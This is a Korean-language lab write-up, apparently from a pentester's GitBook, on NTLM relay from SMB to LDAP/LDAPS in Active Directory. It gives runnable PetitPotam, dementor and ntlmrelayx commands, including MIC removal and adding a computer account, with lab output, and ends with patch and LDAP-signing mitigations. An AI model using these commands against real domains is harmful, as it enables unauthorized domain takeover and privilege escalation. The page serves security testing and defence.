# SMB to LDAP/S

강제 인증, LLMNR/NBT-NS 기반의 NTLM 릴레이 공격은 피해자 서버로부터 SMB 인증 트래픽을 받아 타겟 서버의 LDAP 서비스로 릴레이 한다. 이때 공격자는 액티브 디렉토리의 LDAP 정보 덤프, 컴퓨터 계정 추가, Delegation 등을 통한 권한 상승 공격을 진행할 수 있다.&#x20;

단, SMB to SMB 에 비해 SMB to LDAP(S) 는 필요 조건들이 더 많다. 따라서 webdav, mitm6, 혹은 wpad 릴레이를 통한 HTTP to LDAP(S) 가 더 자주 사용되는 편이다. 그러나 SMB to LDAP(S) 또한 공격에 성공할 경우 도메인 진입 혹은 도메인 장악이 가능하기 때문에 주의가 필요하다.&#x20;

### 조건&#x20;

* NTLMv2 SMB -> LDAP: 타겟이 CVE-2019-1040에 취약 + LDAP Signing - Enabled/Disabled (Required 면 불가능)&#x20;
* NTLMv2 SMB -> LDAPS:  타겟이 CVE-2019-1040에 취약 + EPA Disabled (LDAP Signing 은 enabled/disabled/required 상관 없이  가능)&#x20;
* NTLMv1 SMB -> LDAP: LDAP Signing Enabled/Disabled (Required 면  불가능). 타겟이 CVE-2019-1040에 취약하지 않더라도 `--remove-MIC` 로 MIC 필드 제거 가능.&#x20;
* NTLMv1 SMB -> LDAPS: 조건 없음, 가능. 타겟이 CVE-2019-1040에 취약하지 않더라도 `--remove-MIC` 로 MIC 필드 제거 가능.&#x20;



### NTLMv2 SMB -> LDAP(S)&#x20;

#### 트리거 - 강제 인증 - Petitpotam&#x20;

```
python3 PetitPotam.py -u '' -p '' 192.168.40.132 192.168.40.150
```

#### 트리거- LLMNR/NBT-NS 포이즈닝&#x20;

이론상 가능하지만 현재 테스트 랩에서는 불가능하다. 추후 더 연구해봐야겠다.&#x20;

#### 릴레이 - CVE-2019-1040에  취약할 경우

```
impacket-ntlmrelayx -t ldap://192.168.40.160 -smb2support --add-computer --no-dump --no-da --no-acl --no-validate-privs --remove-mic

[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.40.150, attacking target ldap://192.168.40.160
[*] Authenticating against ldap://192.168.40.160 as CHOI/DC01$ SUCCEED
[*] Adding new computer with username: UAZZYGGM$ and password: lEE_wdrh2JD7T!M result: OK
```



### NTLMv1 SMB -> LDAP(S)&#x20;

#### 트리거 - 강제 인증 - Print Spooler&#x20;

```
python3 dementor.py -u low -p 'Password123!' -d choi.local 192.168.40.132 192.168.40.150
```

#### 트리거 - LLMNR/NBT-NS 포이즈닝&#x20;

이론상 가능하지만 현재 테스트 랩에서는 불가능하다. 추후 더 연구해봐야겠다.&#x20;

#### 릴레이&#x20;

<pre><code>./ntlmrelayx.py -t ldap://192.168.40.160 -smb2support --no-dump --no-da --no-acl --no-validate-privs --remove-mic
<strong>
</strong><strong>[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.40.150, attacking target ldap://192.168.40.160
</strong>[*] Authenticating against ldap://192.168.40.160 as / SUCCEED</code></pre>



### 대응 방안&#x20;

1. NTLMv2 - CVE-2019-1040 관련된 패치를 진행한다. 이는 도메인 컨트롤러들의 기본적인 윈도우 패치만 실행하더라도 패치되는 취약점이다.&#x20;
2. NTLMv2 - LDAP Signing 을 Required 로 설정한다. GPO 를 이용하는 것이 좋다.&#x20;

`(Default Domain Controller Policy 혹은 GPO`) `> Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies >  Security Options > Domain controller: LDAP server signing requirement` - REQUIRED 로 설정&#x20;

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
